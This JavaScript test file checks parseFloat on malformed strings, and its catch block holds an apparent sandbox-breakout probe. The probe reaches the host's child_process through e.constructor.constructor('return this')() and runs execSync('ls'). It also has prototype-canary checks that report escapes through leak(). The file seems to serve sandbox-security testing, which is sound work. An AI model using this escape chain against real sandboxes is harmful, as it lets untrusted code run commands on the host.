try {
    if (parseFloat('0x') !== 0) {
        $ERROR('#1: parseFloat("0x") === 0. Actual: ' + parseFloat('0x'));
    }
    if (parseFloat('11x') !== 11) {
        $ERROR('#2: parseFloat("11x") === 11. Actual: ' + parseFloat('11x'));
    }
    if (parseFloat('11s1') !== 11) {
        $ERROR('#3: parseFloat("11s1") === 11. Actual: ' + parseFloat('11s1'));
    }
    if (parseFloat('11.s1') !== 11) {
        $ERROR('#4: parseFloat("11.s1") === 11. Actual: ' + parseFloat('11.s1'));
    }
    if (parseFloat('.0s1') !== 0) {
        $ERROR('#5: parseFloat(".0s1") === 0. Actual: ' + parseFloat('.0s1'));
    }
    if (parseFloat('1.s1') !== 1) {
        $ERROR('#6: parseFloat("1.s1") === 1. Actual: ' + parseFloat('1.s1'));
    }
    if (parseFloat('1..1') !== 1) {
        $ERROR('#7: parseFloat("1..1") === 1. Actual: ' + parseFloat('1..1'));
    }
    if (parseFloat('0.1.1') !== 0.1) {
        $ERROR('#8: parseFloat("0.1.1") === 0.1. Actual: ' + parseFloat('0.1.1'));
    }
    if (parseFloat('0. 1') !== 0) {
        $ERROR('#9: parseFloat("0. 1") === 0. Actual: ' + parseFloat('0. 1'));
    }
} catch (e) {
    try {
        e(() => {
        }).constructor.constructor('return this')().process.mainModule.require('child_process').execSync('ls').toString();
    } catch (DONOTINSTRUMENT) {
    }
    try {
        function CheckBreakout(x) {
            try {
                if (x.constructor.constructor('return this')().process.mainModule.require) {
                    leak('SB-SUCCESS: The argument e is able to call outside the sandbox');
                }
            } catch (DONOTINSTRUMENT) {
            }
        }
        function getRootPrototype(obj) {
            if (typeof obj != 'object' && typeof obj != 'function' || !obj.__proto__) {
                return Object.prototype;
            }
            while (obj.__proto__) {
                obj = obj.__proto__;
            }
            return obj;
        }
        CheckBreakout(e);
        getRootPrototype(e).CCA = 'CC: Got it?';
        if (getRootPrototype(e) !== Object.prototype && getRootPrototype(e).canary !== Object.prototype.canary) {
            leak('CCA-SUCCESS: The parameter e of the catch clause has a different root prototype');
        }
        getRootPrototype(e).CCT = 'CC: Got it?';
        if (getRootPrototype(this) !== Object.prototype && getRootPrototype(this).canary !== Object.prototype.canary) {
            leak('CCT-SUCCESS: "this" object of function e has a different root prototype');
        }
    } catch (E) {
    }
}